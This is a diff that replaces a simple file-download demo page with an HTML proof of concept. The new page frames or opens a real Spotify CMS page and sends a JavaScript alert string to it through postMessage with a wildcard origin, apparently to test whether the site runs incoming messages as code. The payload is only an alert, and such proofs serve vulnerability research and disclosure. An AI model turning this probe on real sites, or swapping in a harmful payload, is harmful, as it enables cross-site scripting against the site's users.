@@ -1,24 +1,38 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Download File Example</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-</head>
-<body>
-  <iframe id="download-frame" style="display:none;"></iframe>
-  <button id="download-button">Download File</button>
-
-  <script>
-    $(document).ready(function() {
-      $('#download-button').click(function() {
-        var downloadUrl = 'https://i-am-reset.github.io/'; // Replace with your download URL
-        var downloadFrame = $('#download-frame')[0];
-        downloadFrame.src = downloadUrl;
-        downloadFrame.onload = function() {
-          alert('File downloaded successfully! I love you.');
-        }
-      });
-    });
-  </script>
-</body>
-</html>
+     <!doctype html>
+        <html>
+            <head>
+                <meta charset="UTF-8" />
+                <title>POC</title>
+                            <style>
+            body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+            }
+            iframe {
+                border: none;
+                width: 100%;
+                height: 100%;
+            }
+        </style>
+                <script>
+                    function pocLink() {
+                        let win = window.open('https://cms.spotify.com/');
+                        let msg = "alert('Hello, world!')";
+                        
+                        setTimeout(function(){
+                            win.postMessage(msg, '*');
+                        }, 5000);
+                    }
+                    function pocFrame(win) {           
+                        let msg = "alert('Hello, world!')";
+                        
+                        win.postMessage(msg, '*');          
+                    }
+                </script>
+            </head>
+            <body>
+                         
+                <iframe src="https://cms.spotify.com/" onload="pocFrame(this.contentWindow)"></iframe>                    
+            </body>
+        </html>
